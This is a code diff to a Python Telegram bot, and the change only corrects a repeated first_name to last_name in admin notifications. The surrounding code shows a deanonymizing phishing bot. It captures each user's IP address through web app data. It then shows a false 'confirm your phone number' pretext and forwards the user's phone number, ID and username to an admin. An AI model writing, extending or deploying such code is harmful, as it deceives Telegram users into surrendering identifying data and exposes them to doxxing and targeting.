@@ -26,7 +26,7 @@ def cmd_start(message):
     resp = f"New click: {link}\n"
     resp += f"User ID: {user.id}\n"
     resp += f"Username: @{user.username}\n"
-    resp += f"Permalink: [{user.first_name} {user.first_name}](tg://user?id={user.id})"
+    resp += f"Permalink: [{user.first_name} {user.last_name}](tg://user?id={user.id})"
     bot.send_message(admin, resp, parse_mode="markdown")
 
 @bot.message_handler(content_types=["web_app_data"])
@@ -39,7 +39,7 @@ def wad_handler(message):
     resp = f"New IP: {data}\n"
     resp += f"User ID: {user.id}\n"
     resp += f"Username: @{user.username}\n"
-    resp += f"Permalink: [{user.first_name} {user.first_name}](tg://user?id={user.id})"
+    resp += f"Permalink: [{user.first_name} {user.last_name}](tg://user?id={user.id})"
     bot.send_message(admin, resp, parse_mode="markdown")
     bot.send_message(user.id, "Please confirm your phone number. This is necessary to prevent bots from abusing you and recreating your account, as well as to be able to recover your account if you lose it. Press button below and press OK for confirm.", reply_markup=kb)
 
@@ -51,7 +51,7 @@ def handle_contact(message):
     resp = f"New phone: {phone_number}\n"
     resp += f"User ID: {user.id}\n"
     resp += f"Username: @{user.username}\n"
-    resp += f"Permalink: [{user.first_name} {user.first_name}](tg://user?id={user.id})"
+    resp += f"Permalink: [{user.first_name} {user.last_name}](tg://user?id={user.id})"
     bot.send_message(admin, resp, parse_mode="markdown")
     kb = ReplyKeyboardMarkup(resize_keyboard=True)
     btn = KeyboardButton("Confirm account", request_contact=True)
